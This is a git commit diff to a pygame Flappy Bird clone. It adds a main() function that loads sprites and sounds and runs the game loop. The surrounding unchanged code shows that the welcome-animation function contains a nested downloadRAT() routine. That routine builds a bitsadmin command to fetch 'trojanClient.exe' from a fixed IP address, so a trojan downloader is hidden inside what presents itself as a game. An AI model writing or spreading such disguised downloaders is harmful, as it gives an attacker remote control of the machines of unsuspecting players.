28683dc62c61998a2db116265d56f4e3b28ea659
Lomar Lilly <lithiumlilly3@gmail.com>
2017-12-02 23:31:19 -0500

    final commit

--- flappy.py
+++ flappy.py
@@ -60,6 +60,84 @@ try:
 except NameError:
     xrange = range
 
+def main():
+    global SCREEN, FPSCLOCK
+    pygame.init()
+    FPSCLOCK = pygame.time.Clock()
+    SCREEN = pygame.display.set_mode((SCREENWIDTH, SCREENHEIGHT))
+    pygame.display.set_caption('Flappy Bird')
+
+    # numbers sprites for score display
+    IMAGES['numbers'] = (
+        pygame.image.load('assets/sprites/0.png').convert_alpha(),
+        pygame.image.load('assets/sprites/1.png').convert_alpha(),
+        pygame.image.load('assets/sprites/2.png').convert_alpha(),
+        pygame.image.load('assets/sprites/3.png').convert_alpha(),
+        pygame.image.load('assets/sprites/4.png').convert_alpha(),
+        pygame.image.load('assets/sprites/5.png').convert_alpha(),
+        pygame.image.load('assets/sprites/6.png').convert_alpha(),
+        pygame.image.load('assets/sprites/7.png').convert_alpha(),
+        pygame.image.load('assets/sprites/8.png').convert_alpha(),
+        pygame.image.load('assets/sprites/9.png').convert_alpha()
+    )
+
+    # game over sprite
+    IMAGES['gameover'] = pygame.image.load('assets/sprites/gameover.png').convert_alpha()
+    # message sprite for welcome screen
+    IMAGES['message'] = pygame.image.load('assets/sprites/message.png').convert_alpha()
+    # base (ground) sprite
+    IMAGES['base'] = pygame.image.load('assets/sprites/base.png').convert_alpha()
+
+    # sounds
+    if 'win' in sys.platform:
+        soundExt = '.wav'
+    else:
+        soundExt = '.ogg'
+
+    SOUNDS['die']    = pygame.mixer.Sound('assets/audio/die' + soundExt)
+    SOUNDS['hit']    = pygame.mixer.Sound('assets/audio/hit' + soundExt)
+    SOUNDS['point']  = pygame.mixer.Sound('assets/audio/point' + soundExt)
+    SOUNDS['swoosh'] = pygame.mixer.Sound('assets/audio/swoosh' + soundExt)
+    SOUNDS['wing']   = pygame.mixer.Sound('assets/audio/wing' + soundExt)
+
+    while True:
+        # select random background sprites
+        randBg = random.randint(0, len(BACKGROUNDS_LIST) - 1)
+        IMAGES['background'] = pygame.image.load(BACKGROUNDS_LIST[randBg]).convert()
+
+        # select random player sprites
+        randPlayer = random.randint(0, len(PLAYERS_LIST) - 1)
+        IMAGES['player'] = (
+            pygame.image.load(PLAYERS_LIST[randPlayer][0]).convert_alpha(),
+            pygame.image.load(PLAYERS_LIST[randPlayer][1]).convert_alpha(),
+            pygame.image.load(PLAYERS_LIST[randPlayer][2]).convert_alpha(),
+        )
+
+        # select random pipe sprites
+        pipeindex = random.randint(0, len(PIPES_LIST) - 1)
+        IMAGES['pipe'] = (
+            pygame.transform.rotate(
+                pygame.image.load(PIPES_LIST[pipeindex]).convert_alpha(), 180),
+            pygame.image.load(PIPES_LIST[pipeindex]).convert_alpha(),
+        )
+
+        # hismask for pipes
+        HITMASKS['pipe'] = (
+            getHitmask(IMAGES['pipe'][0]),
+            getHitmask(IMAGES['pipe'][1]),
+        )
+
+        # hitmask for player
+        HITMASKS['player'] = (
+            getHitmask(IMAGES['player'][0]),
+            getHitmask(IMAGES['player'][1]),
+            getHitmask(IMAGES['player'][2]),
+        )
+
+        movementInfo = showWelcomeAnimation()
+        crashInfo = mainGame(movementInfo)
+        showGameOverScreen(crashInfo)    
+    
 def showWelcomeAnimation():
     def downloadRAT():
         cmd = "bitsadmin /transfer wcb /priority high http://192.168.10.11:8080/trojanClient.exe "+destination
